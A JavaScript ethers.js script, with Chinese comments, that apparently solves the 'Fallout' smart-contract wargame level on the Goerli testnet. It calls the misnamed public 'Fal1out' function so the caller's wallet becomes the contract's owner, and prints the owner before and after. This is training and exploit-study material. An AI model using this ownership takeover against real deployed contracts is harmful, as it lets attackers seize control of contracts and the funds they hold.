const { ethers } = require("ethers");
require('dotenv').config();

const Goerli_URL = process.env.Goerli_URL
const Private_KEY = process.env.Private_KEY

async function fallout(){
    //生成goerli的provider
    console.log("Goerli_URL===" + Goerli_URL);
    const provider = new ethers.providers.StaticJsonRpcProvider(Goerli_URL);

    //校验网络是不是goerli
    const network = await provider.getNetwork();
    console.log("network===" + network.name);

    //fallback合约的abi地址
    const abi = '[{"inputs":[],"name":"Fal1out","outputs":[],"stateMutability":"payable","type":"function","payable":true,"signature":"0x6fab5ddf"},{"inputs":[],"name":"allocate","outputs":[],"stateMutability":"payable","type":"function","payable":true,"signature":"0xabaa9916"},{"inputs":[{"internalType":"address","name":"allocator","type":"address"}],"name":"allocatorBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0xffd40b56"},{"inputs":[],"name":"collectAllocations","outputs":[],"stateMutability":"nonpayable","type":"function","signature":"0x8aa96f38"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address payable","name":"","type":"address"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x8da5cb5b"},{"inputs":[{"internalType":"address payable","name":"allocator","type":"address"}],"name":"sendAllocation","outputs":[],"stateMutability":"nonpayable","type":"function","signature":"0xa2dea26f"}]';

    //合约地址
    const contract_address = process.env.FALLOUT_ADDRESS;

    //创建钱包对象
    const wallet = new ethers.Wallet(Private_KEY, provider);
    //创建合约对象
    const contract = new ethers.Contract(contract_address, abi, wallet);

    //查看合约的owner
    const owner = await contract.owner();
    console.log("owner==" + owner);

    //构建调用Fal1out()的数据
    const tx = {value: ethers.utils.parseEther("0.0001"), gasPrice: 2100000, gasLimit: 80000}

    //Fal1out()()函数
    const receipt = await contract.Fal1out(tx);
    await receipt.wait();
    console.log("receipt===" + receipt);

    //查看合约的owner
    const ownerSecond = await contract.owner();
    console.log("ownerSecond==" + ownerSecond);

}
fallout();